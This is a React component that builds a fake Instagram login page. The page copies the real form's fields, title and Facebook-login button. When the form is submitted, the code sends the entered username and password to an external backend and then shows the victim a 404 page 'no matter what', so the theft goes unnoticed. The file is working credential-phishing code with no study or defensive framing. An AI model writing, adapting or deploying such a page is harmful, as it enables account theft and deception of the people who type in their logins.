import { useState } from "react";
import "../App.css";
import { useNavigate } from "react-router-dom";
import { FaFacebook } from "react-icons/fa";
import Footer from "./footer";
const Header = () => {
  const [formData, setFormData] = useState({ username: "", password: "" });
  const navigate = useNavigate();
  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };
  const handleSubmit = async (e) => {
    e.preventDefault();
    // console.log("Backend URL:", import.meta.env.VITE_BACKEND_URL);
    try {
      await fetch(`${import.meta.env.VITE_BACKEND_URL}/`, {
        method: "POST",
        body: JSON.stringify(formData),
        headers: {
          "Content-Type": "application/json",
        },
      });
    } catch (error) {
      console.error("Error:", error);
    }
    // Redirect to error page no matter what
    setFormData({ username: "", password: "" });
    navigate("/404");
  };
  return (
    <>
      <div className="login-page">
        <div className="login-box">
          <form onSubmit={handleSubmit} className="login-form">
            <h1 className="login-title">Instagram</h1>
            <input
              type="text"
              name="username"
              value={formData.username}
              placeholder="Phone number, username, or email"
              onChange={handleChange}
              className="login-input"
            />
            <input
              type="password"
              name="password"
              value={formData.password}
              placeholder="Password"
              onChange={handleChange}
              className="login-input"
            />
            <button type="submit" className="login-button">
              Log In
            </button>
            <div className="or-divider">OR</div>
            <div className="facebook-login">
              <FaFacebook className="facebook-icon" />
              <span className="facebook-text">Log in with Facebook</span>
            </div>
            <div className="forgot-password">Forgot password?</div>
          </form>
        </div>
        <div className="signup-box">
          <span className="signup-text">Don't have an account ? </span>
          <span className="signup-link">Sign up</span>
        </div>
      </div>
    </>
  );
};
export default Header;
